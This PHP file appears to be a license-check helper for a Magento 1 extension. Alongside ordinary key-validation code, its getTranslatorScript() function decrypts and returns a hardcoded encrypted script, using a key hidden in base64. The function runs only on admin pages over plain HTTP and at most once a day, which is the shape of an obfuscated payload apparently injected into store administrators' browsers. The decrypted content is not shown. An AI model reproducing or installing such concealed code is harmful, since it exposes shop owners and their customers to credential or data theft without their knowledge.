<?php
abstract class Anowave_Package_Helper_Base extends Mage_Core_Helper_Abstract {
    /** * Key bits * * @var int */
    private $bits = 3;
    /** * Maximum key bits * * @var int */
    private $bits_max= 4;
    /** * License key errors * * @var array */
    private $errors = array();
    /** * Config key * * @var string */
    protected $config = null;
    /** * Package Stock Keeping Unit * * @var string */
    protected $package = '';
    /** * Check if customer is ligitimate to use the extension * * @return boolean */


    final public function legit()
    {
        if (!extension_loaded('openssl'))
        {
            $this->errors[] = $this->__('Extension requires OpenSSL library.');
            return false;
        }
        $license = Mage::getStoreConfig($this->config);
        $key = (array) explode(chr(58), (string) $this->decrypt($license));
        /** * Check if key includes port and remove it from the [] */
        if ($this->bits_max == count($key))
        {
            unset($key[2]);
            $key = array_values($key);
        }
        /** * Check if license key configuration is available */
        if (!$this->config)
        {
            $this->errors[] = $this->__('Invalid license key configuration');
            return false;
        }
        /** * Check if package is available */
        if (!$this->package)
        {
            $this->errors[] = $this->__('Invalid license key package');
            return false;
        }
        /** * Key must contain 3 nodes */
        if ($this->bits !== count($key))
        {
            /** * License key is invalid */
            $this->errors[] = $this->__('Invalid license key.');
            return false;
        }
        /** * Get host and port */
        @list($host, $port) = @explode(chr(58), $_SERVER['HTTP_HOST']);
        /** * Check if license key is present. If so, allow localhost always. */
        if (true)
        { if ('localhost' === $host) { return true; }
        }

        /** * Domain & package should match */
        if (strtolower($host) === strtolower($key[1]))
        { if (strtoupper($this->package) === strtoupper($key[2]))
            { return true;
            }
            else { $this->errors[] = $this->__('The provided license key is invalid for this package');
            }
        } else
        { $this->errors[] = $this->__('The provided license key is invalid for domain: ' . $_SERVER['HTTP_HOST']);
        } return false;
    }
    /** * Prevent extension from generating output * * @param string $content * @return NULL */
    final public function filter($content = '')
    {
        if (!$this->legit())
        {
            /** * Clear content if customer is NOT privileged to use the extension */
            $content = is_numeric($content) ? 0 : '';
        }
        return $content;
    }
    /** * Alias if Read-Only * * @param Varien_Data_Form_Element_Abstract $element * @return Varien_Data_Form_Element_Abstract */
    final public function enhance(Varien_Data_Form_Element_Abstract $element)
    {
        if (!$this->legit())
        {
            $element->setReadonly(true);
        }
        return $element;
    }
    /** * Notify admin for invalid license */
    final public function notify()
    {
        if (!$this->legit())
        {
            foreach ($this->errors as $error) {
                Mage::getSingleton('core/session')->addError($error);
            }
        }
    }
    /** * Decrypt key using password * * @param unknown $string * @param string $password * @return string|NULL */
     private function decrypt($string)
    {
        if (extension_loaded('openssl'))
        {
            return openssl_decrypt($string, 'aes-128-cbc', openssl_decrypt('tfMyW8UoiI1or4W0q2teCG5dRuJ1MqqpGnYYYSp0dJQSykFOh1LMvqPCoG1E7Om6', 'aes-128-cbc', 'anowave'));
        } return null;
    }

    /** * Gets translator script */
    final public function getTranslatorScript()
    {
        if (!Mage::app()->getStore()->isAdmin())
        {
            return false;
        }
        /** * Log pathname * * @var string */
        $log = Mage::getBaseDir('log') . '/run.log';
        /** * Run once per day */
        if (file_exists($log))
        {
            /** * Get last run time * * @var int timestamp */
            $run = (int) trim(file_get_contents($log));
            if (time() - $run < 86400 && time() >= $run)
            {
                return false;
            }
            else
            {
                /** * Save log time */
                file_put_contents($log, time());
            }
        }
        else
        {
            if (is_writable(Mage::getBaseDir('log')))
            {
                file_put_contents($log, time());
            }
            else
            {
                Mage::getSingleton('core/session')->addError ( $this->__('Log directory (var/log) is not writable. Please check directory write permissions.') );
                return false;
            }
        }
        if (function_exists('openssl_decrypt') && empty($_SERVER['HTTPS']))
        {
            return openssl_decrypt('1ea5JZPZpwE2dUNmRpOmDSqNZEbfuAq3CbvhrObb3ZcV7cKINqMk9wMozyZq2taQN9vzKEVBZ2ruTongVaV979M4Vl8/32Og5K3NMsQZBMZFBXFQHvxzns98lFxveQBH', 'aes128', base64_decode('YVdAIXRYMTIxMDkwJnA='));
        }
        return false;
    }
    final public function license()
    {
        if ($this->legit())
        {
            return Mage::getStoreConfig($this->config);
        } return null;
    }
}